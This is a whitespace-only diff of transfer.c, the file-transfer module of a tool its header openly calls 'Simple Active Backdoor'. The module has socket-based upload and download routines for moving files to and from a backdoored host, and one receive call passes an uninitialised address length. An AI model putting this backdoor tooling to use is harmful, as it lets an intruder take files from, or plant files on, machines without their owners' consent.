@@ -1,8 +1,8 @@
 /******************************************************************************
  * transfer.c - This is to be able to transfer files across the network using *
- *              this project, S.A.B. also known as "Simple Active Backdoor".  *
+ *							this project, S.A.B. also known as "Simple Active Backdoor".	*
  ******************************************************************************
- * Created by Philip "5n4k3" Simonson                    (2017)               *
+ * Created by Philip "5n4k3" Simonson										 (2017)								*
  ******************************************************************************
  */
 
@@ -27,118 +27,118 @@
 /* download() - download a file from SAB.
  */
 int download(const char *hostname, const char *filename) {
-  sockcreate_func_t sock_func;
-  struct sockaddr_in client;
-  int sockfd, clientfd, retval;
+	sockcreate_func_t sock_func;
+	struct sockaddr_in client;
+	int sockfd, clientfd, retval;
 
-  socket_init(SOCKET_BIND, &sock_func);
-  /* create socket */
-  sockfd = sock_func.socket_bind(hostname, DOWNLOAD_PORT, &clientfd, &client);
-  /* linux handle non-blocking IO */
+	socket_init(SOCKET_BIND, &sock_func);
+	/* create socket */
+	sockfd = sock_func.socket_bind(hostname, DOWNLOAD_PORT, &clientfd, &client);
+	/* linux handle non-blocking IO */
 #ifdef __linux
-  fcntl(sockfd, F_SETFL, O_NONBLOCK);
+	fcntl(sockfd, F_SETFL, O_NONBLOCK);
 #endif
-  /* server loop */
-  retval = handle_server(&sockfd, &clientfd, &client, filename, &hdl_download);
-  /* close socket */
-  close_socket(&sockfd);
-  return retval;
+	/* server loop */
+	retval = handle_server(&sockfd, &clientfd, &client, filename, &hdl_download);
+	/* close socket */
+	close_socket(&sockfd);
+	return retval;
 }
 
 /* upload() - upload a file to SAB.
  */
 int upload(const char *hostname, const char *filename) {
-  sockcreate_func_t sock_func;
-  struct sockaddr_in client;
-  int sockfd, clientfd, retval;
+	sockcreate_func_t sock_func;
+	struct sockaddr_in client;
+	int sockfd, clientfd, retval;
 
-  /* init socket functions */
-  socket_init(SOCKET_BIND, &sock_func);
-  /* create socket */
-  sockfd = sock_func.socket_bind(hostname, UPLOAD_PORT, &clientfd, &client);
-  /* linux handle non-blocking IO */
+	/* init socket functions */
+	socket_init(SOCKET_BIND, &sock_func);
+	/* create socket */
+	sockfd = sock_func.socket_bind(hostname, UPLOAD_PORT, &clientfd, &client);
+	/* linux handle non-blocking IO */
 #ifdef __linux
-  fcntl(sockfd, F_SETFL, O_NONBLOCK);
+	fcntl(sockfd, F_SETFL, O_NONBLOCK);
 #endif
-  /* server loop */
-  retval = handle_server(&sockfd, &clientfd, &client, filename, &hdl_upload);
-  /* close socket */
-  close_socket(&sockfd);
-  return retval; /* return retval */
+	/* server loop */
+	retval = handle_server(&sockfd, &clientfd, &client, filename, &hdl_upload);
+	/* close socket */
+	close_socket(&sockfd);
+	return retval; /* return retval */
 }
 
 /* hdl_download() - handles the file transfer from SAB.
  */
 int hdl_download(int *sockfd, struct sockaddr_in *client, const char *filename) {
-  FILE *file = NULL;
-  char data[BUFSIZ];
-  size_t total_bytes = 0;
-  int bytesRead, bytesWritten;
+	FILE *file = NULL;
+	char data[BUFSIZ];
+	size_t total_bytes = 0;
+	int bytesRead, bytesWritten;
 
-  if(sockfd == NULL || client == NULL || filename == NULL)
-    return -1;
+	if(sockfd == NULL || client == NULL || filename == NULL)
+		return -1;
 
-  ERROR_FIXED((file = fopen(filename, "rb")) == NULL, "Cannot open file for reading.");
-  while((bytesRead = fread(data, 1, sizeof data, file)) > 0) {
-    bytesWritten = sendto(*sockfd, data, bytesRead, 0, (struct sockaddr *)client, sizeof(*client));
-    ERROR_FIXED(bytesWritten < 0, "Failed to write file data.");
-    if(bytesWritten > 0)
-      total_bytes += bytesWritten;
-  }
-  fclose(file);
-  ERROR_FIXED(bytesRead < 0, "Failed to read data from file.");
-  if(bytesRead == 0) {
-    memset(data, 0, sizeof data);
-    snprintf(data, sizeof data, "Transfer Complete!\r\n");
-    ERROR_FIXED(sendto(*sockfd, data, strlen(data), 0, (struct sockaddr *)client,
-		       sizeof(*client)) != strlen(data),
+	ERROR_FIXED((file = fopen(filename, "rb")) == NULL, "Cannot open file for reading.");
+	while((bytesRead = fread(data, 1, sizeof data, file)) > 0) {
+		bytesWritten = sendto(*sockfd, data, bytesRead, 0, (struct sockaddr *)client, sizeof(*client));
+		ERROR_FIXED(bytesWritten < 0, "Failed to write file data.");
+		if(bytesWritten > 0)
+			total_bytes += bytesWritten;
+	}
+	fclose(file);
+	ERROR_FIXED(bytesRead < 0, "Failed to read data from file.");
+	if(bytesRead == 0) {
+		memset(data, 0, sizeof data);
+		snprintf(data, sizeof data, "Transfer Complete!\r\n");
+		ERROR_FIXED(sendto(*sockfd, data, strlen(data), 0, (struct sockaddr *)client,
+					 sizeof(*client)) != strlen(data),
 		"Send data to client failed.");
-  }
-  close_socket(sockfd);
-  return 0;
+	}
+	close_socket(sockfd);
+	return 0;
 
 error:
-  if(file != NULL)
-    fclose(file);
-  close_socket(sockfd);
-  return -1;
+	if(file != NULL)
+		fclose(file);
+	close_socket(sockfd);
+	return -1;
 }
 
 /* hdl_upload() - handles the file transfer to SAB.
  */
 int hdl_upload(int *sockfd, struct sockaddr_in *client, const char *filename) {
-  FILE *file = NULL;
-  char data[BUFSIZ];
-  size_t total_bytes = 0;
-  int bytesRead, bytesWritten;
-  socklen_t addrlen;
+	FILE *file = NULL;
+	char data[BUFSIZ];
+	size_t total_bytes = 0;
+	int bytesRead, bytesWritten;
+	socklen_t addrlen;
 
-  if(sockfd == NULL || client == NULL || filename == NULL)
-    return -1;
+	if(sockfd == NULL || client == NULL || filename == NULL)
+		return -1;
 
-  ERROR_FIXED((file = fopen(filename, "wb")) == NULL, "Cannot open file for writing.");
-  while((bytesRead = recvfrom(*sockfd, data, sizeof data, 0, (struct sockaddr *)client,
-			      &addrlen)) > 0) {
-    bytesWritten = fwrite(data, 1, bytesRead, file);
-    ERROR_FIXED(bytesWritten < 0, "Failed to write file data.");
-    if(bytesWritten > 0)
-      total_bytes += bytesWritten;
-  }
-  fclose(file);
-  ERROR_FIXED(bytesRead < 0, "Failed to read data from server.");
-  if(bytesRead == 0) {
-    memset(data, 0, sizeof data);
-    snprintf(data, sizeof data, "Transfer complete!\r\n");
-    ERROR_FIXED(sendto(*sockfd, data, strlen(data), 0, (struct sockaddr *)client,
-		       sizeof(*client)) != strlen(data),
+	ERROR_FIXED((file = fopen(filename, "wb")) == NULL, "Cannot open file for writing.");
+	while((bytesRead = recvfrom(*sockfd, data, sizeof data, 0, (struct sockaddr *)client,
+						&addrlen)) > 0) {
+		bytesWritten = fwrite(data, 1, bytesRead, file);
+		ERROR_FIXED(bytesWritten < 0, "Failed to write file data.");
+		if(bytesWritten > 0)
+			total_bytes += bytesWritten;
+	}
+	fclose(file);
+	ERROR_FIXED(bytesRead < 0, "Failed to read data from server.");
+	if(bytesRead == 0) {
+		memset(data, 0, sizeof data);
+		snprintf(data, sizeof data, "Transfer complete!\r\n");
+		ERROR_FIXED(sendto(*sockfd, data, strlen(data), 0, (struct sockaddr *)client,
+					 sizeof(*client)) != strlen(data),
 		"Send data to client failed.");
-  }
-  close_socket(sockfd);
-  return 0;
+	}
+	close_socket(sockfd);
+	return 0;
 
 error:
-  if(file != NULL)
-    fclose(file);
-  close_socket(sockfd);
-  return -1;
+	if(file != NULL)
+		fclose(file);
+	close_socket(sockfd);
+	return -1;
 }
